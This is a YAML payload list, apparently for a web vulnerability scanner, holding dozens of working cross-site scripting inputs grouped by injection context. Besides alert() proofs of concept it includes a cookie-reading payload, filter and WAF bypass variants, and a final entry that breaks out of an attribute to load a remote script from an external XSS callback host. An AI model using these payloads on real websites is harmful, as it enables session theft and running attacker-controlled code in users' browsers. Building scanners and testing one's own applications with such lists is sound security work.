xss:
  # --- Standard HTML Tags ---
  - value: "<script>alert(1)</script>"
    expected_context: html
  - value: "<script>confirm(1)</script>"
    expected_context: html
  - value: "<script>prompt(1)</script>"
    expected_context: html

  # --- Event Handlers (Image/SVG/Body) ---
  - value: "<img src=x onerror=alert(1)>"
    expected_context: html
    requires: ["onerror"]
  - value: "<svg/onload=alert(1)>"
    expected_context: html
    requires: ["onload"]
  - value: "<body onload=alert(1)>"
    expected_context: html
    requires: ["onload"]
  - value: "<iframe src=\"javascript:alert(1)\">"
    expected_context: html
  - value: "<details open ontoggle=alert(1)>"
    expected_context: html
    requires: ["ontoggle"]
  - value: "<audio src=x onerror=alert(1)>"
    expected_context: html
    requires: ["onerror"]

  # --- Attribute Injection (Breaking out) ---
  - value: "\"><script>alert(1)</script>"
    expected_context: html
    expected_subcontext: attribute
  - value: "'><script>alert(1)</script>"
    expected_context: html
    expected_subcontext: attribute
  - value: "\"><img src=x onerror=alert(1)>"
    expected_context: html
    expected_subcontext: attribute
  - value: "\"><svg/onload=alert(1)>"
    expected_context: attribute
    expected_subcontext: attribute
  - value: "'><svg/onload=alert(1)>"
    expected_context: attribute
    expected_subcontext: attribute
  - value: "'\"><svg/onload=alert(1)>"
    expected_context: attribute
    expected_subcontext: attribute
  - value: "'><svg/onload=alert(document.cookie)>"
    expected_context: attribute
    expected_subcontext: attribute
  - value: "'\"> <details open ontoggle=alert(1)>"
    expected_context: html
    expected_subcontext: attribute
  - value: "'\"> <svg/onload=alert(1)>"
    expected_context: html
    expected_subcontext: attribute
  - value: "\" autofocus onfocus=alert(1) x=\""
    expected_context: attribute
  - value: "\" onmouseover=alert(1) \""
    expected_context: attribute
  - value: "' onerror='alert()'"
    expected_context: attribute
    requires: ["onerror"]

  # --- Protocol Handlers ---
  - value: "javascript:alert(1)"
    expected_context: attribute
  - value: "javascript:confirm(document.domain)"
    expected_context: attribute
  - value: "javascript://%0aalert(1)"
    expected_context: attribute
  - value: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    expected_context: attribute

  # --- Javascript Context Injection ---
  - value: "';alert(1);//"
    expected_context: javascript
  - value: "</script><script>alert(1)</script>"
    expected_context: javascript
  - value: "\";alert(1);//"
    expected_context: javascript
  - value: "-alert(1)-"
    expected_context: javascript
  - value: "1;alert(1)"
    expected_context: javascript

  # --- Client-Side Template Injection (CSTI) ---
  - value: "{{7*7}}"
    expected_context: html
  - value: "${7*7}"
    expected_context: html
  - value: "{{constructor.constructor('alert(1)')()}}"
    expected_context: html

waf_bypass:
  - value: "<scr<script>ipt>alert(1)</script>"
    expected_context: html
  - value: "<img src=x onerror=&#0000097lert(1)>"
    expected_context: html
  - value: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
    expected_context: html

execution:
  - value: "<script>document.title='XSS_EXEC'</script>"
    expected_context: html
  - value: "<img src=x onerror=\"document.body.setAttribute('data-xss','1')\">"
    expected_context: attribute
    requires: ["onerror"]
  - value: "<svg onload=\"window.__xss=true\"></svg>"
    expected_context: html
    requires: ["onload"]
  - value: "<script>console.log('XSS_EXEC')</script>"
    expected_context: html
  - value: "'\"><script src=https://xss.report/c/drpece></script>"
    expected_context: html
    expected_subcontext: attribute
    breaks_out_of: quoted_attribute
    loads_external_script: true
    requires:
      - html_injection
      - no_strict_csp